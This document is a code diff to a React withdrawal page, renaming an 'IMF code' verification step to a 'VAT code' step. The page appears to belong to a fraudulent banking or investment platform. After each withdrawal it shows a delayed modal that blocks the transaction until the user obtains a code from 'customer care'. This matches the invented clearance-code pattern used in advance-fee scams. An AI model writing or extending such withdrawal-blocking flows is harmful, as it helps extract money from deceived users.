@@ -40,13 +40,13 @@ const Withdraw = () => {
   const [showWithdrawalModal, setShowWithdrawalModal] = useState(false)
   const [selectedWithdrawal, setSelectedWithdrawal] = useState(null)
   
-  // IMF and BOT code verification states
-  const [showImfModal, setShowImfModal] = useState(false)
+  // VAT and BOT code verification states
+  const [showVatModal, setShowVatModal] = useState(false)
   const [showBotModal, setShowBotModal] = useState(false)
-  const [imfCode, setImfCode] = useState('')
+  const [vatCode, setVatCode] = useState('')
   const [botCode, setBotCode] = useState('')
   const [currentWithdrawalId, setCurrentWithdrawalId] = useState(null)
-  const [imfSubmitting, setImfSubmitting] = useState(false)
+  const [vatSubmitting, setVatSubmitting] = useState(false)
   const [botSubmitting, setBotSubmitting] = useState(false)
 
   const location = useLocation()
@@ -140,7 +140,7 @@ const Withdraw = () => {
         })
         setWithdrawHistory(data.withdrawals || [])
         
-        // Check for pending withdrawals that need IMF or BOT codes
+        // Check for pending withdrawals that need VAT or BOT codes
         checkPendingWithdrawals(data.withdrawals || [])
       } else {
         const errorData = await response.json()
@@ -163,7 +163,7 @@ const Withdraw = () => {
       setCurrentWithdrawalId(pendingWithdrawal.id || pendingWithdrawal._id)
       
       if (pendingWithdrawal.status === 'imf_required') {
-        setShowImfModal(true)
+        setShowVatModal(true)
       } else if (pendingWithdrawal.status === 'bot_required') {
         setShowBotModal(true)
       }
@@ -284,9 +284,9 @@ const Withdraw = () => {
         // Refresh balance after successful withdrawal
         fetchBalance()
         
-        // Show IMF modal after a short delay
+        // Show VAT modal after a short delay
         setTimeout(() => {
-          setShowImfModal(true)
+          setShowVatModal(true)
         }, 3000)
       } else {
         setError(data.message || 'Withdrawal failed')
@@ -314,13 +314,13 @@ const Withdraw = () => {
       case 'approved': return 'text-green-600 bg-green-100'
       case 'pending': 
       case 'imf_required': return 'text-yellow-600 bg-yellow-100'
-      case 'imf_pending': return 'text-orange-600 bg-orange-100'
+      case 'vat_pending': return 'text-orange-600 bg-orange-100'
       case 'bot_required': return 'text-purple-600 bg-purple-100'
       case 'bot_pending': return 'text-indigo-600 bg-indigo-100'
       case 'processing': return 'text-blue-600 bg-blue-100'
       case 'failed': 
       case 'rejected':
-      case 'imf_rejected':
+      case 'vat_rejected':
       case 'bot_rejected': return 'text-red-600 bg-red-100'
       case 'cancelled': return 'text-gray-600 bg-gray-100'
       default: return 'text-gray-600 bg-gray-100'
@@ -329,9 +329,9 @@ const Withdraw = () => {
 
   const getStatusDisplayText = (status) => {
     switch (status) {
-      case 'imf_required': return 'IMF Required'
-      case 'imf_pending': return 'IMF Pending'
-      case 'imf_rejected': return 'IMF Rejected'
+      case 'imf_required': return 'VAT Required'
+      case 'vat_pending': return 'VAT Pending'
+      case 'vat_rejected': return 'VAT Rejected'
       case 'bot_required': return 'BOT Required'
       case 'bot_pending': return 'BOT Pending'
       case 'bot_rejected': return 'BOT Rejected'
@@ -345,43 +345,43 @@ const Withdraw = () => {
     }
   }
 
-  // IMF Code submission
-  const submitImfCode = async () => {
-    if (!imfCode.trim()) {
-      setError('Please enter the IMF code')
+  // VAT Code submission
+  const submitVatCode = async () => {
+    if (!vatCode.trim()) {
+      setError('Please enter the VAT code')
       return
     }
 
-    setImfSubmitting(true)
+    setVatSubmitting(true)
     setError('')
 
     try {
-      const response = await fetch(`${API_BASE}/payments/withdrawal/${currentWithdrawalId}/imf-code`, {
+      const response = await fetch(`${API_BASE}/payments/withdrawal/${currentWithdrawalId}/vat-code`, {
         method: 'POST',
         headers: {
           'Authorization': `Bearer ${token}`,
           'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ imfCode: imfCode.trim() })
+        body: JSON.stringify({ vatCode: vatCode.trim() })
       })
 
       const data = await response.json()
 
       if (response.ok) {
-        setShowImfModal(false)
-        setImfCode('')
-        setSuccess('IMF code submitted successfully. Waiting for confirmation.')
+        setShowVatModal(false)
+        setVatCode('')
+        setSuccess('VAT code submitted successfully. Waiting for confirmation.')
         // Refresh withdrawal history
         if (activeTab === 'history') {
           fetchWithdrawHistory()
         }
       } else {
-        setError(data.message || 'Failed to submit IMF code')
+        setError(data.message || 'Failed to submit VAT code')
       }
     } catch (err) {
       setError('Network error. Please try again.')
     } finally {
-      setImfSubmitting(false)
+      setVatSubmitting(false)
     }
   }
 
@@ -1103,8 +1103,8 @@ const Withdraw = () => {
           </div>
         )}
 
-        {/* IMF Code Modal */}
-        {showImfModal && (
+        {/* VAT Code Modal */}
+        {showVatModal && (
           <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
             <div className="bg-white rounded-lg shadow-xl max-w-md w-full mx-4">
               <div className="p-6">
@@ -1115,17 +1115,17 @@ const Withdraw = () => {
                     </svg>
                   </div>
                 </div>
-                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">IMF Code is required.</h3>
+                <h3 className="text-lg font-semibold text-gray-900 text-center mb-2">VAT Code is required.</h3>
                 <p className="text-sm text-gray-600 text-center mb-6">
-                  The IMF code is required for this transaction to be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the IMF code for this transaction.
+                  The VAT code is required for this transaction to be completed successfully. You can visit any of our nearest branches or contact our online customer care representative for more details of the VAT code for this transaction.
                 </p>
                 
                 <div className="mb-4">
-                  <label className="block text-sm font-medium text-gray-700 mb-2">Enter IMF Code:</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">Enter VAT Code:</label>
                   <input
                     type="text"
-                    value={imfCode}
-                    onChange={(e) => setImfCode(e.target.value)}
+                    value={vatCode}
+                    onChange={(e) => setVatCode(e.target.value)}
                     placeholder="••••••"
                     className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                     maxLength="20"
@@ -1139,20 +1139,20 @@ const Withdraw = () => {
                 <div className="flex space-x-3">
                   <button
                     onClick={() => {
-                      setShowImfModal(false)
-                      setImfCode('')
+                      setShowVatModal(false)
+                      setVatCode('')
                     }}
                     className="flex-1 px-4 py-2 border border-gray-300 text-gray-700 rounded-md hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500"
-                    disabled={imfSubmitting}
+                    disabled={vatSubmitting}
                   >
                     Cancel
                   </button>
                   <button
-                    onClick={submitImfCode}
-                    disabled={imfSubmitting || !imfCode.trim()}
+                    onClick={submitVatCode}
+                    disabled={vatSubmitting || !vatCode.trim()}
                     className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
                   >
-                    {imfSubmitting ? 'Verifying...' : 'Verify'}
+                    {vatSubmitting ? 'Verifying...' : 'Verify'}
                   </button>
                 </div>
               </div>
@@ -1280,11 +1280,11 @@ const Withdraw = () => {
                     </div>
                   )}
                   
-                  {selectedWithdrawal.imfCode && (
+                  {selectedWithdrawal.vatCode && (
                     <div>
-                      <label className="block text-sm font-medium text-gray-700 mb-1">IMF Code</label>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">VAT Code</label>
                       <p className="text-sm text-gray-900 font-mono bg-gray-50 p-2 rounded">
-                        {selectedWithdrawal.imfCode}
+                        {selectedWithdrawal.vatCode}
                       </p>
                     </div>
                   )}
